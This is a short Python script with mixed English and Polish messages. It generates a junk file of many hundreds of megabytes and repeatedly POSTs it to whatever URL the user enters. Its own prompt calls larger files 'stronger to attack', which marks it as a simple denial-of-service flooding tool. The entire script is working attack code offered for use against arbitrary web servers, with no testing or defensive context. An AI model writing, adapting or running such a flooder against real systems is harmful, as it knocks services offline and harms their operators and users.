import requests
import time

def send_file(file_path, url):
    with open(file_path, 'r') as file:
        data = file.read()
    response = requests.post(url, data=data)
    return response

file_path = 'plik.txt'

url = input('Enter the URL (with http or https etc): ')

while True:
    try:
        num_requests = int(input('How many times do you want to send the request? (0 for generate the .txt file)\n'))
        break
    except ValueError:
        print('This is not a number')

if num_requests == 0:
    while True:
        try:
            size_in_100mb = int(input('Enter the size of the generated file in multiples of 100 MB (haviest files are sthronger to attack but the lite one s making lowest risc to program crash): '))
            break
        except ValueError:
            print('This is not a number')
    num_chars = size_in_100mb * 100 * 1024 * 1024
    start_time = time.time()
    with open(file_path, "w") as file:
        file.write("1" + "0"*num_chars)
    end_time = time.time()
    print("Czas generowania pliku:", end_time - start_time, "sekund.")
    print("Generowanie pliku zakończone.")
else:
    for i in range(num_requests):
        response = send_file(file_path, url)